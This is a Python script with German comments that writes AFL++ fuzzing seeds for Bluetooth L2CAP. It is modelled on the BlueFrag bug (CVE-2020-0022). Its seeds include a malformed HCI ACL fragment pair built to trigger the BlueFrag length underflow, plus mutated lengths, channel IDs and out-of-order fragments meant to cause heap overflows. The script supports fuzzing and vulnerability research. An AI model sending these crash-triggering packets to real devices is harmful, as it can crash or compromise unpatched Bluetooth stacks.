#!/usr/bin/env python3
"""
WiZZA L2CAP Seed Generator für AFL++
Extrahiert aus BlueFrag-DNA (CVE-2020-0022).
Generiert mutierte HCI/L2CAP-Fragmente, um Heap-Overflows im Bluetooth-Stack zu triggern.
"""
import os
import struct

SEED_DIR = "seeds/bluetooth_l2cap"
os.makedirs(SEED_DIR, exist_ok=True)

def write_seed(filename, data):
    path = os.path.join(SEED_DIR, filename)
    with open(path, "wb") as f:
        f.write(data)
    print(f"[+] Seed generiert: {path}")

def create_l2cap_start(total_len, cid=0x0041, payload=b"\x0a\x00\x00\x00"):
    """Erzeugt L2CAP Basic Frame Start Header"""
    return struct.pack("<HH", total_len, cid) + payload

def create_hci_acl(handle, flags, data):
    """Verpackt Daten in ein HCI ACL Datenpaket (0x02)"""
    hci_handle = handle | (flags << 12)
    return bytes([0x02]) + struct.pack("<HH", hci_handle, len(data)) + data

print("[*] Generiere Initial-Seeds für AFL++ Bluetooth-Fuzzer...")

# 1. Die reine BlueFrag-DNA (Der perfekte Underflow-Trigger)
# Setzt total_len auf 0xFFFF und sendet direkt ein Continuation-Fragment.
l2cap_base = create_l2cap_start(0xFFFF)
pkt_start = create_hci_acl(0x000B, 0b10, l2cap_base)  # PB=10 (Start)
pkt_cont = create_hci_acl(0x000B, 0b01, b"\x00" * 32) # PB=01 (Continuation)
write_seed("bluefrag_base_trigger.bin", pkt_start + pkt_cont)

# 2. Mutationen der deklarierten Länge (Underflow/Overflow-Grenzen abtasten)
lengths = [0x0000, 0x0001, 0xFFFE, 0x7FFF, 0x8000, 0x1000]
for length in lengths:
    l2cap_mut = create_l2cap_start(length)
    p_start = create_hci_acl(0x000B, 0b10, l2cap_mut)
    # Kombiniere mit massiven Overwrite-Payloads
    write_seed(f"l2cap_len_{length:04x}_small.bin", p_start + create_hci_acl(0x000B, 0b01, b"A" * 16))
    write_seed(f"l2cap_len_{length:04x}_large.bin", p_start + create_hci_acl(0x000B, 0b01, b"B" * 1024))

# 3. Channel-ID (CID) Fuzzing
# Wir testen neben A2MP (0x0041) auch Signaling (0x0001), Connectionless (0x0002) und ATT (0x0004)
cids = [0x0001, 0x0002, 0x0004, 0x0006, 0x0007]
for cid in cids:
    l2cap_cid_mut = create_l2cap_start(0xFFFF, cid=cid)
    p_start = create_hci_acl(0x000B, 0b10, l2cap_cid_mut)
    write_seed(f"l2cap_cid_{cid:04x}.bin", p_start + pkt_cont)

# 4. Fragment-Chaos (Out-of-Order / Missing Start Packets)
# Testet den Reassembly-Code des Stacks, wenn die Reihenfolge nicht stimmt.
write_seed("l2cap_orphan_cont.bin", pkt_cont * 5)
write_seed("l2cap_double_start.bin", pkt_start + pkt_start + pkt_cont)

print(f"\n[+] Perfekt. {len(os.listdir(SEED_DIR))} hochgiftige Seeds liegen im Ordner bereit.")
